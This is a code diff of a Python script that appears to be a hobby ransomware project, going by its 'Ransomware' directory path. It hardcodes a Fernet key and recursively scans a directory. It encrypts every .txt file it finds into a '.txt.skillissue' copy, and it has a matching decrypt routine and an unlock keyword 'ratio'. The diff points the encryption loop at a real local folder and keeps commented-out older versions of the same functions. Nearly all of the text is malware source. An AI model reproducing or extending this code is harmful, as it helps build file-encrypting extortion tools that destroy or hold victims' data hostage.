@@ -4,38 +4,28 @@ from cryptography.fernet import Fernet
 import tkinter as tk
 from tkinter import filedialog
 
-# KEY_FILE = "symmetric_key.key"
-
 man_key = '7YcQu1c94E2rJx3o9VCZ62A0L2rVYuMYa5W3H1IVyhQ='
 
-# def load_symmetric_key():
-#     if os.path.exists(KEY_FILE):
-#         with open(KEY_FILE, 'rb') as f:
-#             key = f.read()
-#     else:
-#         key = Fernet.generate_key()
-#         with open(KEY_FILE, 'wb') as f:
-#             f.write(key)
-#     return key
-
-def encrypt(dataFile, symmetric_key):
+def encrypt(dataFile, fernet_key):
     if dataFile.name.endswith('.txt'):
+        dataFile = Path(dataFile.path)  # Convert to a pathlib.Path object
         with open(dataFile, 'rb') as f:
             data = f.read()
 
-        cipher_suite = Fernet(symmetric_key)
+        cipher_suite = Fernet(fernet_key)
         encrypted_data = cipher_suite.encrypt(data)
 
         encrypted_file = dataFile.with_suffix('.txt.skillissue')
         with open(encrypted_file, 'wb') as f:
             f.write(encrypted_data)
 
-def decrypt(dataFile, symmetric_key):
+def decrypt(dataFile, fernet_key):
     if dataFile.name.endswith('.txt.skillissue'):
+        dataFile = Path(dataFile.path)  # Convert to a pathlib.Path object
         with open(dataFile, 'rb') as f:
             encrypted_data = f.read()
 
-        cipher_suite = Fernet(symmetric_key)
+        cipher_suite = Fernet(fernet_key)
         decrypted_data = cipher_suite.decrypt(encrypted_data)
 
         decrypted_file = dataFile.with_suffix('')
@@ -49,6 +39,37 @@ def scanRecurse(baseDir):
         elif entry.is_dir():
             yield from scanRecurse(entry.path)
 
+# def encrypt(dataFile, symmetric_key):
+#     if dataFile.name.endswith('.txt'):
+#         with open(dataFile, 'rb') as f:
+#             data = f.read()
+
+#         cipher_suite = Fernet(symmetric_key)
+#         encrypted_data = cipher_suite.encrypt(data)
+
+#         encrypted_file = dataFile.with_suffix('.txt.skillissue')
+#         with open(encrypted_file, 'wb') as f:
+#             f.write(encrypted_data)
+
+# def decrypt(dataFile, symmetric_key):
+#     if dataFile.name.endswith('.txt.skillissue'):
+#         with open(dataFile, 'rb') as f:
+#             encrypted_data = f.read()
+
+#         cipher_suite = Fernet(symmetric_key)
+#         decrypted_data = cipher_suite.decrypt(encrypted_data)
+
+#         decrypted_file = dataFile.with_suffix('')
+#         with open(decrypted_file, 'wb') as f:
+#             f.write(decrypted_data)
+
+# def scanRecurse(baseDir):
+#     for entry in os.scandir(baseDir):
+#         if entry.is_file():
+#             yield entry
+#         elif entry.is_dir():
+#             yield from scanRecurse(entry.path)
+
 def verify_keyword(keyword):
     return keyword == "ratio" 
 
@@ -56,7 +77,7 @@ def verify_keyword(keyword):
 # symmetric_key = load_symmetric_key()
 
 # Encrypt all files in the current directory and its subdirectories
-directory = './THISDOESNTPOINTTOANYDIRCTORYYET'  # Change this to the directory containing the files to be encrypted
+directory = "C:/Users/Admin/Desktop/python/Ransomware/fernet"  # Change this to the directory containing the files to be encrypted
 for item in scanRecurse(directory):
     # encrypt(item, symmetric_key)
     encrypt(item, man_key)
